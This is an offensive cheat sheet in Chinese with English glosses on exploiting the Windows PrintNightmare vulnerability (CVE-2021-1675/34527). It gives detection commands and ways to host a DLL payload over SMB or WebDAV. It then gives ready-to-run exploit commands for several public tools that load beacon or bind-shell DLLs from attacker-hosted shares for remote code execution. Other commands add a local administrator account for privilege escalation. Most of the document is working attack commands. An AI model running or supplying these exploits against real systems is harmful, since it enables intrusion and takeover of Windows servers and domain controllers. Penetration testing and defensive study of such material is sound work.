# PrintNightmare (打印梦魇)

> CVE-2021-1675 / CVE-2021-34527

DLL 将存储在 `C:\Windows\System32\spool\drivers\x64\3\` 中。
该漏洞利用将从本地文件系统或远程共享执行该 DLL。

要求 (Requirements):

* 启用 **Spooler Service** (后台打印后台处理程序服务) (强制)
* 安装了 2021 年 6 月之前补丁的服务器
* 带有 `Pre Windows 2000 Compatibility` (Windows 2000 之前的兼容性) 组的 DC
* 带有注册表项 `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1 的服务器
* 带有注册表项 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0 的服务器

**检测漏洞 (Detect the vulnerability)**:

* Impacket - [impacket/rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)

  ```ps1
  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
  Protocol: [MS-RPRN]: Print System Remote Protocol
  ```

* [byt3bl33d3r/ItWasAllADream](https://github.com/byt3bl33d3r/ItWasAllADream)

  ```ps1
  cd ItWasAllADream && poetry install && poetry shell
  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
  docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
  ```

**Payload 托管 (Payload Hosting)**:

* 自从 [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109) 后，Payload 可以托管在 Impacket SMB 服务器上:

  ```ps1
  python3 ./smbserver.py share /tmp/smb/
  ```

* 使用 [3gstudent/Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (需要在主机上拥有管理员权限):

  ```ps1
  Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
  ```

* 使用带有 [SharpWebServer](https://github.com/mgeeky/SharpWebServer) 的 WebDav (不需要管理员权限):

  ```ps1
  SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
  ```

使用 WebDav 而不是 SMB 时，必须在 URI 中的主机名中添加 `@[PORT]`，例如：`\\172.16.1.5@8888\Downloads\beacon.dll`
目标主机上**必须**激活 WebDav 客户端。默认情况下，它在 Windows 工作站上未激活 (你必须使用 `net start webclient`)，并且它也没有安装在服务器上。以下是检测是否激活了 webdav 的方法:

```ps1
nxc smb -u user -p password -d domain.local -M webdav [TARGET]
```

**触发漏洞 (Trigger the exploit)**:

* [cube0x0/SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)

  ```powershell
  # 需要修改后的 Impacket: https://github.com/cube0x0/impacket
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
  ## LPE (本地提权)
  SharpPrintNightmare.exe C:\addCube.dll
  ## RCE 使用现有上下文
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
  ## RCE 使用 runas /netonly
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
  ```

* [calebstewart/Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)

  ```powershell
  ## 仅 LPE (PS1 + DLL)
  Import-Module .\cve-2021-1675.ps1
  Invoke-Nightmare # 默认在本地管理员组中添加用户 `adm1n`/`P@ssw0rd`
  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
  ```

* [gentilkiwi/mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)

  ```powershell
  ## LPE
  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
  ## RCE
  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
  ```

* [outflanknl/PrintNightmare](https://github.com/outflanknl/PrintNightmare)

  ```powershell
  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
  ```

**调试信息 (Debug informations)**

| 错误 (Error) | 消息 (Message)        | 调试 (Debug)                               |
|--------|-----------------------|------------------------------------------|
| 0x5    | `rpc_s_access_denied` | SMB 共享文件的权限 (Permissions on the file in the SMB share) |
| 0x525  | `ERROR_NO_SUCH_USER`  | 指定的帐户不存在。(The specified account does not exist.) |
| 0x180  | 未知错误代码          | 共享不是 SMB2 (Share is not SMB2)              |

## 参考资料 (References)

* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
* [A Practical Guide to PrintNightmare in 2024 - itm4n - Jan 28, 2024](https://itm4n.github.io/printnightmare-exploitation/)
